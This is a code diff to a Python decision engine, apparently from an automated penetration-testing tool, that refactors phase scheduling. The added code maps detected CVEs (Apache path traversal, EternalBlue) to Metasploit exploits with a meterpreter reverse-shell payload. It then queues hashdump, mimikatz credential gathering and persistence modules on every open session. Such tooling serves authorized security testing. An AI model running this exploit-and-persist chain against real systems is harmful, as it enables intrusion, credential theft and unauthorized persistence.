@@ -115,33 +115,25 @@ class DecisionEngine:
 
     def decide_next_phase(self, playbook_phases: List[Dict]) -> List[Dict]:
         """Given the playbook phases, decide which to run based on current state."""
-        to_run = []
-        for phase in playbook_phases:
-            when_cond = phase.get('when')
-            if when_cond:
-                if not self._evaluate_condition(when_cond):
-                    continue
-            depends = phase.get('depends_on', [])
-            skip = False
-            for dep in depends:
-                dep_result = self.results_cache.get(dep)
-                if dep_result is None:
-                    continue
-                for item in dep_result:
-                    if _payload(item).get("error"):
-                        logger.warning(
-                            "Skipping phase %s due to error in dependency %s",
-                            phase["name"],
-                            dep,
-                        )
-                        skip = True
-                        break
-                if skip:
-                    break
-            if skip:
-                continue
-            to_run.append(phase)
-        return to_run
+        return [phase for phase in playbook_phases if self.should_run_phase(phase)[0]]
+
+    def should_run_phase(self, phase: dict) -> tuple[bool, str | None]:
+        """Return whether a playbook phase can run and its skip reason."""
+        when_cond = phase.get("when")
+        if when_cond and not self._evaluate_condition(when_cond):
+            return False, f"condition not met: {when_cond}"
+
+        for dep in phase.get("depends_on", []):
+            dep_results = self.results_cache.get(dep)
+            if dep_results and all(_payload(item).get("error") for item in dep_results):
+                logger.warning(
+                    "Skipping phase %s because dependency %s failed",
+                    phase.get("name"),
+                    dep,
+                )
+                return False, f"dependency {dep} failed"
+
+        return True, None
 
     def _evaluate_condition(self, condition: str) -> bool:
         """Evaluate a condition string against the current state."""
@@ -166,37 +158,67 @@ class DecisionEngine:
     def generate_post_phase_actions(self, phase_name: str, phase_results: List[Dict]) -> List[Dict]:
         """Generate additional tasks based on phase results."""
         actions = []
-        # If we have vulnerabilities and Metasploit is available, trigger exploit.
-        if self.state.get('vuln_found') and self.state.get('vuln_found') is not False:
-            for vuln in self.state.get('vulnerabilities', []):
-                cve = vuln.get('cve')
-                if cve:
-                    # Simple mapping of CVEs to Metasploit modules
-                    if cve in ['CVE-2021-41773', 'CVE-2021-42013']:
-                        actions.append({
-                            'tool': 'metasploit',
-                            'args': [
-                                'exploit/multi/http/apache_path_traversal',
-                                f'RHOSTS={self.target}',
-                                'PAYLOAD=linux/x64/meterpreter/reverse_tcp',
-                                'LHOST=0.0.0.0'
-                            ],
-                            'when': 'always'
-                        })
-                    elif cve == 'CVE-2017-0143' or cve == 'MS17-010':
-                        actions.append({
-                            'tool': 'metasploit',
-                            'args': [
-                                'exploit/windows/smb/ms17_010_eternalblue',
-                                f'RHOSTS={self.target}'
-                            ],
-                            'when': 'always'
-                        })
-        # If we have sessions, run post‑exploitation modules.
-        if self.state.get('has_session'):
-            actions.extend([
-                {'tool': 'metasploit', 'args': ['post/windows/gather/hashdump', 'SESSION=1']},
-                {'tool': 'metasploit', 'args': ['post/windows/gather/credentials/mimikatz', 'SESSION=1']},
-                {'tool': 'metasploit', 'args': ['post/windows/manage/persistence_exe', 'SESSION=1']},
-            ])
+        exploit_modules = {
+            "CVE-2021-41773": (
+                "exploit/multi/http/apache_path_traversal",
+                ["PAYLOAD=linux/x64/meterpreter/reverse_tcp", "LHOST=0.0.0.0"],
+            ),
+            "CVE-2021-42013": (
+                "exploit/multi/http/apache_path_traversal",
+                ["PAYLOAD=linux/x64/meterpreter/reverse_tcp", "LHOST=0.0.0.0"],
+            ),
+            "CVE-2017-0143": ("exploit/windows/smb/ms17_010_eternalblue", []),
+            "MS17-010": ("exploit/windows/smb/ms17_010_eternalblue", []),
+        }
+        if self.state.get("vuln_found"):
+            for vuln in self.state.get("vulnerabilities", []):
+                cve = vuln.get("cve")
+                match = exploit_modules.get(cve)
+                if not match:
+                    continue
+                module, options = match
+                if self._action_fired("exploit", cve, module):
+                    continue
+                actions.append(
+                    {
+                        "tool": "metasploit",
+                        "phase": "proof_of_impact",
+                        "stage": "exploit",
+                        "finding_id": cve,
+                        "args": [module, *options],
+                    }
+                )
+
+        if self.state.get("has_session"):
+            post_modules = [
+                "post/windows/gather/hashdump",
+                "post/windows/gather/credentials/mimikatz",
+                "post/windows/manage/persistence_exe",
+            ]
+            for session in self.state.get("sessions", []):
+                session_id = session.get("id") if isinstance(session, dict) else None
+                if session_id is None:
+                    continue
+                for module in post_modules:
+                    if self._action_fired("post", str(session_id), module):
+                        continue
+                    actions.append(
+                        {
+                            "tool": "metasploit",
+                            "phase": "post_exploitation",
+                            "stage": "post",
+                            "finding_id": str(session_id),
+                            "args": [module, f"SESSION={session_id}"],
+                        }
+                    )
         return actions
+
+    def _action_fired(self, stage: str, finding_id: str, module: str) -> bool:
+        return f"{stage}:{finding_id}:{module}" in self._fired_actions
+
+    def mark_actions_fired(self, actions: list[dict]) -> None:
+        for action in actions:
+            key = f"{action.get('stage')}:{action.get('finding_id')}:{action['args'][0]}"
+            self._fired_actions.add(key)
+        self.state["fired_actions"] = sorted(self._fired_actions)
+        save_state(self.target, self.state, job_id=self.job_id)
